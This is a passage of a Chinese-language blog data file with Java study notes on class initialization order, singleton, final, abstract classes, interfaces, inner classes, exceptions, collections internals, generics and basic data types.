<li>代码块调用顺序优先于构造器</li>
</ol>
<h4 id="细节讨论"><a href="#细节讨论" class="headerlink" title="细节讨论"></a>细节讨论</h4><ol>
<li>static代码块也叫静态代码块，作用就是对类进行初始化，而且它随着类的加载而执行，并且只会执行一次，如果是普通代码块，每创建一个对象，就执行</li>
<li>类什么时候被加载<ol>
<li>创建对象实例时</li>
<li>创建子类对象实例，父类也会被加载</li>
<li>使用类的静态成员时</li>
</ol>
</li>
<li>普通的代码块，在创建对象实例时，会被隐式的调用。被创建一次，就会调用一次。如果只是使用类的静态成员时，普通代码块并不会执行</li>
<li>创建一个对象时，在一个类调用顺序时<ol>
<li>调用静态代码块和静态属性初始化（两个优先级一样，按定义顺序调用）</li>
<li>调用普通代码块和普通属性的初始化（两个优先级一样，按定义顺序调用）</li>
<li>调用构造方法</li>
</ol>
</li>
<li>构造器的最前面其实隐含了super()和调用普通代码块，在类加载时，就执行完毕</li>
<li>创建一个子类时，它们的静态代码块，静态属性初始化，普通代码块，普通属性初始化，构造方法的调用顺序<ol>
<li>父类的静态代码块和静态属性（优先级一样，按定义顺序）</li>
<li>子类的静态代码块和静态属性（优先级一样，按定义顺序）</li>
<li>父类的普通代码块和普通属性初始化（优先级一样，按定义顺序）</li>
<li>父类的构造方法</li>
<li>子类的普通代码块和普通属性初始化</li>
<li>子类的构造方法</li>
</ol>
</li>
<li>静态代码块只能调用静态成员，普通代码块可以调用任意成员</li>
</ol>
<h3 id="单例设计模式"><a href="#单例设计模式" class="headerlink" title="单例设计模式"></a>单例设计模式</h3><p>单例模式就是采取一定的方法保证在整个的软件系统中，对某个类只能存在一个对象实例，并且该类只提供一个取得其对象实例的方法</p>
<ol>
<li>构造器私有化=》防止直接new</li>
<li>类的内部创建对象</li>
<li>向外暴露一个静态的公共方法</li>
</ol>
<p>饿汉式VS懒汉式</p>
<ol>
<li>二者最主要的区别在于创建对象的时机不同；饿汉式是在类加载就创建了对象实例，而懒汉式是在使用时才创建</li>
<li>饿汉式不存在线程安全问题，懒汉式存在线程安全问题</li>
<li>饿汉式存在浪费资源的可能，因为如果程序员一个对象实例都没有使用，那么饿汉式创建的对象就浪费了，懒汉式是使用时才创建，就不存在这个问题</li>
<li>javaSE标准类中，java.lang.Runtime就是单例模式</li>
</ol>
<h3 id="final关键字"><a href="#final关键字" class="headerlink" title="final关键字"></a>final关键字</h3><p>final可以修饰类、属性、方法和局部变量</p>
<ol>
<li>当不希望类被继承时，可以用final修饰</li>
<li>当不希望父类的某个方法被子类覆盖/重写时，可以用final关键字修饰</li>
<li>当不希望类的某个属性的值被修改，可以用final</li>
<li>当不希望某个局部变量被修改，可以使用final修饰</li>
</ol>
<h4 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h4><ol>
<li>final修饰的属性又叫常量</li>
<li>final修饰的属性在定义时，必须赋值，并且以后不能再修改，赋值可以在如下位置之一<ol>
<li>定义时</li>
<li>在构造器中</li>
<li>在代码块中</li>
</ol>
</li>
<li>如果final修饰的属性是静态的，则初始化的位置只能是定义时或在静态代码块，不能在构造器中赋值</li>
<li>final类不能继承，但是可以实例化对象</li>
<li>如果类不是final类，但是含有final方法，则该方法虽然不能重写，但是可以被继承</li>
<li>一般来说，如果一个方法以及是final类了，就没必要再将方法修饰成final方法</li>
<li>final不能修饰构造方法</li>
<li>final和static往往搭配使用，效率更高，底层编译器做了优化处理</li>
<li>包装类（Integer，Double，Boolean等都是final），String也是final类</li>
</ol>
<h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><p>当父类的一些方法不能确定时，可以用abstract关键字来修饰该方法，这个方法就是抽象方法，用abstract来修饰该类就是抽象类</p>
<ol>
<li>用abstract关键字来修饰一个类时，这个类就叫抽象类访问修饰符abstract 类名{}</li>
<li>用abstract关键字来修饰一个方法时，这个方法就是抽象方法 访问修饰符 abstract 返回类型 方法名(参数列表)： //没有方法体</li>
<li>抽象类的价值更多作用是在于设计，是设计者设计好后，让子类继承并实现抽象类()</li>
</ol>
<h4 id="抽象类细节"><a href="#抽象类细节" class="headerlink" title="抽象类细节"></a>抽象类细节</h4><ol>
<li>抽象类不能被实例化</li>
<li>抽象类不一定要包含abstract方法</li>
<li>一旦类包含了abstract方法，则这个类必须声明为abstract</li>
<li>abstract只能修饰类和方法，不能修饰属性和其它的</li>
<li>抽象类可以有任意成员，比如：非抽象方法、构造器、静态属性等待</li>
<li>抽象方法不能有主体，即不能实现</li>
<li>如果一个类继承了抽象类，则它必须实现抽象类的所有抽象方法，除非它自己也声明为abstract类</li>
<li>抽象方法不能使用private、final和static来修饰，因为这些关键字都是和重写相违背的</li>
</ol>
<h4 id="抽象类-模板设计模式"><a href="#抽象类-模板设计模式" class="headerlink" title="抽象类-模板设计模式"></a>抽象类-模板设计模式</h4><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>接口就是给出一些没有实现的方法，封装到一起，到某个类要使用的时候，在根据具体情况把这些方法写出来</p>
<p>在jdk8后，可以有默认实现方法，需要使用default关键字修饰，也可以有静态方法</p>
<h4 id="接口细节"><a href="#接口细节" class="headerlink" title="接口细节"></a>接口细节</h4><ol>
<li>接口不能被实例化</li>
<li>接口中所有方法是public方法，接口中抽象方法，可以不同abstract修饰</li>
<li>一个普通类实现接口，就必须将该接口的所有方法都实现</li>
<li>抽象类实现接口，可以不用实现接口的方法</li>
<li>一个类同时可以实现多个接口</li>
<li>接口中的属性只能是final，而且是public static final 修饰符</li>
<li>接口中属性的访问形式：接口名.属性名</li>
<li>一个接口不能继承其他的类，但是可以继承多个别的接口</li>
<li>接口的修饰符只能是public和默认，这点和类的修饰符一样</li>
</ol>
<h4 id="接口和继承类"><a href="#接口和继承类" class="headerlink" title="接口和继承类"></a>接口和继承类</h4><p>接口和继承解决的问题不同</p>
<p>继承的价值在于：解决代码的复用性和可维护性<br>接口的价值在于：设计好的各种规范，让其他类去实现这些方法</p>
<p>接口比继承更加灵活</p>
<p>接口在一定程度上实现代码解耦</p>
<h4 id="接口多态"><a href="#接口多态" class="headerlink" title="接口多态"></a>接口多态</h4><ol>
<li>多态参数</li>
<li>多态数组</li>
<li>接口存在多态传递现象</li>
</ol>
<h3 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h3><p>一个类的内部又完整的嵌套了另一个类结构。被嵌套的类称为内部类，嵌套其他类的类称为外部类。内部类可以直接访问私有属性，并且可以体现类与类之间的包含关系</p>
<h4 id="内部类的分类"><a href="#内部类的分类" class="headerlink" title="内部类的分类"></a>内部类的分类</h4><p>定义在外部类局部位置上</p>
<ol>
<li>局部内部类（有类名）</li>
<li>匿名内部类（没有类名，重点）</li>
</ol>
<p>定义在外部类的成员位置上</p>
<ol>
<li>成员内部类（没用static修饰）</li>
<li>静态内部类（使用static修饰）</li>
</ol>
<h4 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h4><p>局部内部类是定义在外部类的局部位置，比如方法中，并且有类名</p>
<ol>
<li>可以直接访问外部类的所有成员，包含私有的</li>
<li>不能添加访问修饰符，因为它的地位就是一个局部变量。局部变量不能使用修饰符。但是可以使用final修饰</li>
<li>作用域：仅仅在定义它的方法或代码块中</li>
<li>局部内部类—-访问—-&gt;外部类的成员【直接访问】</li>
<li>外部类—-访问—-&gt;局部内部类的成员【创建对象，再访问】</li>
<li>外部其他类—-不能访问—-&gt;局部内部类</li>
<li>如果外部类和局部内部类的成员方法重名时，默认遵循就近原则，如果想访问外部类的成员，可以使用（外部类名.this.成员）去访问</li>
</ol>
<h4 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h4><p>匿名内部类是定义在外部类的局部位置，比如方法中</p>
<h4 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a>成员内部类</h4><p>定义在外部类的成员位置，没有static修饰</p>
<ol>
<li>可以直接访问外部类的所有成员，包含私有的</li>
<li>可以添加任意访问修饰符（pubic，protected，默认，private）</li>
<li>作用域和外部类的其他成员一样，为整个类体</li>
<li>成员内部类—-访问—-&gt;外部类【直接访问】</li>
<li>外部类—-访问—-&gt;内部类【创建对象，再访问】</li>
<li>外部其他类—-访问—-&gt;成员内部类</li>
<li>如果外部类和局部内部类的成员方法重名时，默认遵循就近原则，如果想访问外部类的成员，可以使用（外部类名.this.成员）去访问</li>
</ol>
<h4 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h4><p>定义在外部类的成员位置，并且有static修饰</p>
<ol>
<li>可以直接访问外部类的所有静态成员，包含私有的，但不能直接访问非静态成员</li>
<li>可以添加任意访问修饰符</li>
<li>作用域：为整个类体</li>
<li>静态内部类—-访问—-&gt;外部类【直接访问所有静态成员】</li>
<li>外部类—-访问—-&gt;静态内部类【创建对象，再访问】</li>
<li>外部其他类—-&gt;访问—-&gt;静态内部类</li>
<li>如果外部类和局部内部类的成员方法重名时，默认遵循就近原则，如果想访问外部类的成员，可以使用（外部类名.this.成员）去访问</li>
</ol>
<h2 id="枚举和注释"><a href="#枚举和注释" class="headerlink" title="枚举和注释"></a>枚举和注释</h2><h3 id="自定义枚举"><a href="#自定义枚举" class="headerlink" title="自定义枚举"></a>自定义枚举</h3><ol>
<li>构造器私有化</li>
<li>本类内部创建一组对象</li>
<li>对外暴露对象</li>
<li>提供get方法，不提供set</li>
</ol>
<h3 id="枚举关键字"><a href="#枚举关键字" class="headerlink" title="枚举关键字"></a>枚举关键字</h3><ol>
<li>当我们使用enum关键字开发一个枚举类时，默认会继承Enum类，且不能继承其他类了</li>
<li>如果使用无参构造器 创建 枚举对象，则实参列表和小括号都可以省略</li>
<li>当有多个枚举对象时，使用，间隔，最后一个分号结尾</li>
<li>枚举对象必须放在枚举类的行首</li>
<li>枚举类和普通类一样，可以实现接口</li>
</ol>
<h3 id="Annotation元注解"><a href="#Annotation元注解" class="headerlink" title="Annotation元注解"></a>Annotation元注解</h3><ol>
<li>@Override：限定某个方法，是重写父类方法，该注解只能用于方法</li>
<li>@Deprecated：用于表示某个程序元素（类，方法等）已过时</li>
<li>@SuppressWarnings：抑制编译器警告</li>
<li>@Target是修饰注解的注解</li>
</ol>
<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><ol>
<li>异常分为两大类，运行时异常和编译时异常</li>
<li>运行时异常，编译器不要求强制处置的一次。一般是指编程时的逻辑错误</li>
<li>对于运行时异常，可以不做处理，因为很普遍，全处理可能会对程序的可读性和运行效率产生影响</li>
<li>编译时异常，是编译器要求必须处置的异常</li>
</ol>
<h3 id="运行时异常"><a href="#运行时异常" class="headerlink" title="运行时异常"></a>运行时异常</h3><ol>
<li>NullPointerException空指针异常。当应用程序试图在需要对象的地方使用null时，抛出该异常</li>
<li>ArithmeticException数学运算异常。当出现异常的运算条件时，抛出此异常</li>
<li>ArrayIndexOutOfBoundsException数组下标越界异常</li>
<li>ClassCastException类型转换异常</li>
<li>NumberFormatException数字格式不正确异常</li>
</ol>
<h3 id="编译异常"><a href="#编译异常" class="headerlink" title="编译异常"></a>编译异常</h3><ol>
<li>SQLException。操作数据库时，查询表可能发生异常</li>
<li>IOException 操作文件时，发生的异常</li>
<li>FileNotFoundException 操作一个不存在的文件时，发生异常</li>
<li>ClassNotFoundException 加载类，而该类不存在时，异常</li>
<li>EOFException 操作文件，到文件末尾，发生异常</li>
<li>ILLegalArguementException 参数异常</li>
</ol>
<h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><ol>
<li>try-catch-finally。程序员自己处理</li>
<li>throws。</li>
</ol>
<h4 id="try-catch处理异常"><a href="#try-catch处理异常" class="headerlink" title="try-catch处理异常"></a>try-catch处理异常</h4><ol>
<li>如果异常发生了，则异常发生后面的代码不会执行，直接进入catch块</li>
<li>如果异常没有发生，则顺序执行try的代码块，不会进入到catch</li>
<li>如果希望不管是否发生异常，都执行某段代码，则使用finally</li>
<li>可以有多个catch，捕获不同的异常，要求父类异常在后，子类异常在前</li>
<li>可以进行try-finally配合使用，这种用法相当于没有捕获异常，因此程序会直接崩掉</li>
</ol>
<h4 id="try-catch-finally执行顺序"><a href="#try-catch-finally执行顺序" class="headerlink" title="try-catch-finally执行顺序"></a>try-catch-finally执行顺序</h4><ol>
<li>如果没有出现异常，则执行try块中所有语句，不执行catch块中语句，如果有finally，最后还需要执行finally里面的语句</li>
<li>如果出现异常，则try块中异常发生后，剩下的语句不再执行。将执行catch块中的语句，如果有finally，最后还需要执行finally里面的语句</li>
</ol>
<h4 id="throws异常处理"><a href="#throws异常处理" class="headerlink" title="throws异常处理"></a>throws异常处理</h4><ol>
<li>对于编译异常，程序中必须处理，比如try-catch或者throws</li>
<li>对于运行时异常，程序中如果没有处理，默认就是throws的方式处理</li>
<li>子类重写父类的方法时，对抛出异常的规定：子类重写的方法所抛出的异常类型要么和父类抛出的异常一致，要么为父类抛出的异常的类型的子类型</li>
<li>在throws过程中，如果有方法try-catch，就相当于处理异常，就可以不必throws</li>
</ol>
<h4 id="throw和throws的区别"><a href="#throw和throws的区别" class="headerlink" title="throw和throws的区别"></a>throw和throws的区别</h4><ol>
<li>throws是异常处理的一种方式，在方法声明出，后面跟异常类型</li>
<li>throw是手动生成异常对象的关键字，在方法体中，后面跟异常对象</li>
</ol>
<h2 id="常用类"><a href="#常用类" class="headerlink" title="常用类"></a>常用类</h2><h3 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h3><h4 id="包装类和基本数据类型的转换"><a href="#包装类和基本数据类型的转换" class="headerlink" title="包装类和基本数据类型的转换"></a>包装类和基本数据类型的转换</h4><ol>
<li>jdk5前手动装箱和拆箱方式，装箱；基本数据类型-&gt;包装类型，反之，拆箱</li>
<li>jdk5以后的自动装箱和拆箱方式</li>
<li>自动装箱底层调用的是valueOf方法</li>
</ol>
<h3 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h3><ol>
<li>String对象用于保存字符串，也就是一组字符序列</li>
<li>字符串常量对象时用双引号扩起的字符序列</li>
<li>字符串的字符使用Unicode字符编码，一个字符占两个字节</li>
<li>String类较常用构造方法</li>
<li>String是一个final类，代表不可变的字符序列</li>
<li>字符串是不可变的，一个字符串对象一旦被分配，其内容是不可变的</li>
</ol>
<h4 id="两种创建String对象的区别"><a href="#两种创建String对象的区别" class="headerlink" title="两种创建String对象的区别"></a>两种创建String对象的区别</h4><p>方式一：直接赋值String s = “hsp”;<br>方式二：调用构造器 String s2 = new String(“hsp”);</p>
<ol>
<li>方式一：先从常量池查看是否有”hsp”数据空间，如果有，直接指向；如果没有则重新创建，然后指向。s最终指向的是常量池的空间地址</li>
<li>方式二：先在堆中创建空间，里面维护了value属性，指向常量池的hsp空间。如果常量池没有”hsp”，重新创建，如果有，直接通过value指向。最终指向的是堆中的空间地址</li>
</ol>
<p><img src="/2021/10/19/Java-%E9%AB%98%E7%BA%A7/String内存.png" alt="photo"></p>
<h4 id="StringBuffer"><a href="#StringBuffer" class="headerlink" title="StringBuffer"></a>StringBuffer</h4><p>代表可变的字符序列，可以对字符串内容进行增删</p>
<p>StringBuffer保存的是字符串变量，里面的值可以更改，每次更新实际上可以更新内容，不用更新地址</p>
<h4 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h4><p>一个可变的字符序列。不保证同步，用在字符串缓冲区被单个线程使用</p>
<h3 id="Calendar"><a href="#Calendar" class="headerlink" title="Calendar"></a>Calendar</h3><ol>
<li>Calendar是一个抽象类，构造器是private</li>
</ol>
<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><h3 id="Collection接口"><a href="#Collection接口" class="headerlink" title="Collection接口"></a>Collection接口</h3><h4 id="List"><a href="#List" class="headerlink" title="List"></a>List</h4><ol>
<li>List集合类中元素有序、且可重复</li>
<li>List集合中的每个元素都有其对应的顺序索引，即支持索引</li>
<li>List容器中的元素都对应一个整数型的序号记载其在容器中的位置，可以根据序号存取容器中的元素</li>
</ol>
<h5 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h5><ol>
<li>可以加入null，并且多个</li>
<li>是由数组来实现数据存储的</li>
<li>基本等同于Vector，除了线程不安全</li>
<li>当创建ArrayList对象时，如果使用的是无参构造器，则初始elementData容量为0，第一次添加，则扩容elementData为10，如需要再次扩容，则扩容elementData为1.5倍</li>
<li>如果使用的是指定大小的构造器，则初始elementData容量为指定大小，如果需要扩容，则直接扩容elementData为1.5倍</li>
</ol>
<h5 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h5><ol>
<li>实现了双向链表和双端队列特点</li>
<li>可以添加任意元素（元素可以重复），包括null</li>
<li>线程不安全</li>
<li>remove()默认删除第一个</li>
</ol>
<h5 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h5><ol>
<li>底层也是对象数组</li>
<li>Vector是线程同步的，即线程安全</li>
<li>如果是无参构造，则初始容量是10，每次按2倍扩容</li>
<li>如果是有参构造，则初始容量为指定大小，每次按2倍扩容</li>
</ol>
<h4 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h4><ol>
<li>无序（添加和取出的顺序不一致），没有索引</li>
<li>不允许重复元素，所以最多包含一个null</li>
</ol>
<h5 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h5><ol>
<li>HashSet实现了Set接口</li>
<li>实际上是HashMap，HashMap底层是(数组+链表+红黑树)</li>
<li>可以存放null值，但是只能有一个null</li>
<li>HashSet不保证元素是有序的，取决于hash后，再确定索引的结果</li>
<li>不能有重复元素/对象</li>
</ol>
<p>HashSet添加元素底层实现</p>
<ol>
<li>添加一个元素时，先得到hash值，会转成-&gt;索引值</li>
<li>找到存储数据表table，看这个索引位置是否已经存放的有元素</li>
<li>如果没有，直接加入。如果有，调用equals比较，如果相同，就放弃添加，如果不相同，则添加到最后</li>
<li>在Java8中，如果一条链表的元素个数超过TREEIFY_THRESHOLD（默认是8），并且table的大小 &gt;= MIN_TREEIFY_CAPACITY(默认64)就会进行树化</li>
</ol>
<p>扩容机制</p>
<ol>
<li>第一次添加时，table数组扩容到16，临界值是16*加载因子(loadFactor)是0.75=12</li>
<li>如果table数组使用到了临界值12，就会扩容到16<em>2=32，新的临界值就是32</em>0.75=24，依次类推</li>
<li>在Java8中，如果一条链表的元素个数到达TREEIFY_THRESHOLD(默认是8)并且table的大小 &gt;= MIN_TREEIFY_CAPACITY(默认64)，就会进行树化，否则仍然采用数组扩容机制</li>
</ol>
<p>去重机制<br>hashCode() + equals()，底层先通过存入对象，进行运算得到一个hash值，通过hash值得到对应的索引，如果发现table索引所在的位置，没有数据，就直接存放，如果有数据，就进行equals比较，不相同就加入，否则不加入</p>
<h5 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h5><ol>
<li>是HashSet的子类</li>
<li>底层是LinkedHashMap，底层维护了一个数组+双向链表</li>
<li>根据元素的hashCode值来决定元素的存储位置，同时使用链表维护元素的次序，使得元素看起来是以插入顺序保存的</li>
<li>不允许添加重复元素</li>
</ol>
<h5 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h5><p>去重机制<br>如果你传入了一个Comparator匿名对象，就使用实现的compare去重，如果方法返回0，就认为是相同的，不添加。如果没有传入一个Comparator匿名对象，则以添加的对象实现的Comparable接口的compareTo去重</p>
<h3 id="Map接口"><a href="#Map接口" class="headerlink" title="Map接口"></a>Map接口</h3><ol>
<li>与Collection并列存在，用于保存具有映射关系的数据</li>
<li>Map中的key和value可以是任何引用类型的数据，会封装到HashMap$Node对象中</li>
<li>Map中的key不允许重复</li>
<li>Map中的value可以重复</li>
<li>Map中的key可以为null，value也可以为null，key为null只能有一个，value为null可以多个</li>
<li>常用String类作为Map的key</li>
</ol>
<p>六大遍历方式</p>
<ol>
<li>containsKey</li>
<li>keySet：获取所有的键</li>
<li>entrySet：获取所有关系</li>
</ol>
<h4 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h4><ol>
<li>底层是数组+链表+红黑树</li>
<li>是以key-val对的方式来存储数据</li>
<li>key不能重复，但是值可以重复，允许使用null键和null值</li>
<li>如果添加相同的key，则会覆盖原来的key-val，等同于修改</li>
<li>不保证映射的顺序，底层是以hash表的方式来存储的</li>
<li>没有实现同步，线程不安全</li>
</ol>
<h4 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h4><ol>
<li>存放的元素是键值对：即K-V</li>
<li>键和值不能为null</li>
<li>hashTable是线程安全的</li>
<li>底层有数组Hashtable$Entry[]初始化大小为11</li>
<li>临界值 threshold 8 = 11 * 0.75</li>
<li>扩容为2倍+1</li>
</ol>
<h4 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h4><ol>
<li>Properties类继承自Hashtable类并且实现了Map接口，也是使用一种键值对的形式来保存数据</li>
<li>键和值不能为null</li>
</ol>
<h4 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h4><h3 id="Collections工具类"><a href="#Collections工具类" class="headerlink" title="Collections工具类"></a>Collections工具类</h3><ol>
<li>是一个操作Set、List和Map等集合的工具类</li>
<li>提供了一系列静态的方法对集合元素进行排序、查询和修改等操作</li>
</ol>
<h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><ol>
<li>传统的方法不能对加入到集合中的数据类型进行约束</li>
<li>传统的方法遍历的时候需要进行类型转换，如果集合中数据量较大，对效率有影响</li>
</ol>
<p>使用泛型好处</p>
<ol>
<li>编译时，检查添加元素的类型，提高了安全性</li>
<li>减少了类型转换的次数，提高效率</li>
<li>不再提示编译警告</li>
</ol>
<p>泛型介绍</p>
<ol>
<li>泛型又称参数化类型，解决数据类型的安全性问题</li>
<li>在类声明或实例化时只要指定好需要的具体的类型即可</li>
<li>Java泛型可以保证如果程序在编译时没有发出警告，运行时就不会产生异常。同时，代码更加简洁、健壮</li>
<li>可以在类声明时通过一个标识表示类中某个属性的类型，或者是某个方法的返回值的类型，或者是参数类型、</li>
<li>泛型不具备继承性</li>
</ol>
<p>细节</p>
<ol>
<li>普通成员可以使用泛型</li>
<li>使用泛型的数组，不能初始化</li>
<li>静态方法中不能使用类的泛型</li>
<li>泛型类的类型，是在创建对象时确定的</li>
<li>如果在创建对象时，没有指定对象，默认为Object</li>
</ol>
<h2 id="Java绘图技术"><a href="#Java绘图技术" class="headerlink" title="Java绘图技术"></a>Java绘图技术</h2><ol>
<li>Component类提供了两个和绘图相关最重要的方法<ol>
<li>paint(Graphics g)绘制组件的外观</li>
<li>repaint()刷新组件的外观</li>
</ol>
</li>
<li>当组件第一次在屏幕显示的时候，程序会自动的调用paint()方法来绘制组件</li>
<li>以下情况paint()将会被调用<ol>
<li>窗口最小化再最大化</li>
<li>窗口的大小发生变化</li>
<li>repaint函数被调用</li>
</ol>
</li>
</ol>
<h2 id="程序进程线程"><a href="#程序进程线程" class="headerlink" title="程序进程线程"></a>程序进程线程</h2>]]></content>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习</title>
    <url>/2021/10/02/Java%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="Java常见基础知识"><a href="#Java常见基础知识" class="headerlink" title="Java常见基础知识"></a>Java常见基础知识</h2><h3 id="Java概述"><a href="#Java概述" class="headerlink" title="Java概述"></a>Java概述</h3><h4 id="JDK-JRE-JVM的关系"><a href="#JDK-JRE-JVM的关系" class="headerlink" title="JDK,JRE,JVM的关系"></a>JDK,JRE,JVM的关系</h4><p>JDK(Java Development Kits Java开发工具包) = JRE(Java Runtime Environment Java运行环境)+ java开发工具<br>JRE = JVM(Java Virtual Machine Java虚拟机) + 核心类库</p>
<h4 id="Java编写步骤"><a href="#Java编写步骤" class="headerlink" title="Java编写步骤"></a>Java编写步骤</h4><ol>
<li>编写java的源代码</li>
<li>javac 编译，得到对应的 .class 字节码文件</li>
<li>java 运行，本质就是把 .class 加载到jvm 运行</li>
</ol>
<h4 id="Java编写7个规范"><a href="#Java编写7个规范" class="headerlink" title="Java编写7个规范"></a>Java编写7个规范</h4><ol>
<li>类，方法的注释，使用javadoc的方式，即文档注释</li>
<li>非javadoc注释，往往是对代码的说明（给程序的维护者），说明如何修改，注意事项</li>
<li>使用tab，整体将代码右移，使用shift+tab整体左移</li>
<li>运算符和 = 的两边，给空格，代码看上去清楚</li>
<li>源码文件使用 utf-8编码</li>
<li>行宽字符不要超过 80</li>
<li>代码编程风格有两种风格</li>
</ol>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="变量使用注意"><a href="#变量使用注意" class="headerlink" title="变量使用注意"></a>变量使用注意</h4><ol>
<li>变量表示内存中的一个存储区域</li>
<li>该区域有自己的名称和类型</li>
<li>变量必须先声明，后使用，即有顺序</li>
<li>该区域的数据/值可以在同一类型范围内不断变化</li>
<li>变量在同一个作用域内不能重名</li>
<li>变量=变量名+值+数据类型</li>
</ol>
<h4 id="程序中-号使用"><a href="#程序中-号使用" class="headerlink" title="程序中 +号使用"></a>程序中 +号使用</h4><p>当左右两边都是数值型时，则做加法运算<br>当左右两边有一方为字符串，则做拼接运算<br>System.out.println(“100”+98);//10098<br>System.out.println(100+”98”);/10098</p>
<h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><ul>
<li>基本数据类型<ul>
<li>数值型<ul>
<li><a href="#Integer">整数类型(byte[1],short[2],int[4],long[8])</a></li>
<li><a href="#Float">浮点类型(float[4],double[8])</a></li>
</ul>
</li>
<li><a href="#Char">字符型</a><pre><code>char[2]
</code></pre></li>
<li><a href="#boolean">布尔型</a> <pre><code>boolean[1]
</code></pre></li>
</ul>
</li>
<li>引用数据类型<ul>
<li>类(class)</li>
<li>接口(interface)</li>
<li>数组([])</li>
</ul>
</li>
</ul>
<h5 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a><span id="Integer">整数类型</span></h5><ol>
<li>Java各整数类型有固定的范围和字段长度，不受具体OS的影响，以保证java程序的可移植性</li>
<li>Java的整型常量默认为int型，声明long型变量须后加“l”或“L”</li>
<li>java程序中变量声明为int型，除非不足以表示大数，才使用long</li>
<li>bit：计算机中的最小存储单位。byte：计算机中基本存储单元</li>
</ol>
<h5 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a><span id="Float">浮点类型</span></h5><ol>
<li>与整数类型类似，Java浮点类型也有固定的范围和字段长度，不受具体OS的影响</li>
<li>Java的浮点型常量默认为double型，声明float型常量，须后加“f”或“F”</li>
<li>浮点型常量两种表示形式<ol>
<li>十进制数形式：如5.12  512.0f .512</li>
<li>科学计数法形式：5.12e2</li>
</ol>
</li>
<li>通常情况下，应该使用double型，因为它比float型更精确</li>
<li>浮点数使用陷阱：2.7 和 8.1/3 比较</li>
</ol>
<h5 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a><span id="Char">字符类型</span></h5><ol>
<li>字符常量是用单引号(‘’)括起来的单个字符</li>
<li>Java中还允许使用转义字符’\’来将其后的字符转变为特殊字符型常量</li>
<li>在java中，char的本质是一个整数，在输出时，是unicode码对应的字符</li>
<li>可以直接给char赋一个整数，然后输出时，会按照对应的unicode字符输出</li>
<li>char类型是可以进行运算的，相当于一个整数，因为它都对应有Unicode码</li>
</ol>
<h5 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a><span id="boolean">布尔类型</span></h5><ol>
<li>布尔类型也叫boolean类型，boolean类型数据只允许取值true和false，无null</li>
<li>boolean类型占1个字节</li>
<li>boolean类型适用于逻辑运算，一般用于程序流程控制</li>
</ol>
<h4 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h4><p>当java程序在进行赋值或运算时，精度小的类型自动转换为精度大的数据类型，为自动类型转换</p>
<h5 id="基本数据类型转换"><a href="#基本数据类型转换" class="headerlink" title="基本数据类型转换"></a>基本数据类型转换</h5><ol>
<li>有多种类型的数据混合运算时，系统首先自动将所有数据转换成容量最大的那种数据类型，然后再进行计算</li>
<li>当我们把精度大的数据类型赋值给精度小的数据类型时，就会报错，反之就会进行自动类型转换</li>
<li>(byte,short)和char之间不会相互自动转换</li>
<li>byte,short,char 他们三者可以计算，在计算时首先转换为int类型</li>
<li>boolean不参与转换</li>
<li>自动提示原则：表达式结果的类型自动提升为 操作数中最大的类型</li>
</ol>
<h5 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h5><ol>
<li>当进行数据的大小从大—&gt;小，就需要使用强制转换</li>
<li>强转符号只针对最近的操作数有效，往往会使用小括号提升优先级</li>
<li>char类型可以保存int的常量值，但不能保存int的变量值，需要强转</li>
<li>byte和short类型在进行运算时，当做int类型处理</li>
</ol>
<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><p>取模%的本质 a%b = a - a / b * b</p>
<h4 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h4><h4 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h4><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><p>&amp;&amp;与&amp;的区别(||与|类似)</p>
<ol>
<li>&amp;&amp;短路与：如果第一个条件为false，则第二个条件不会判断，最终结果为false</li>
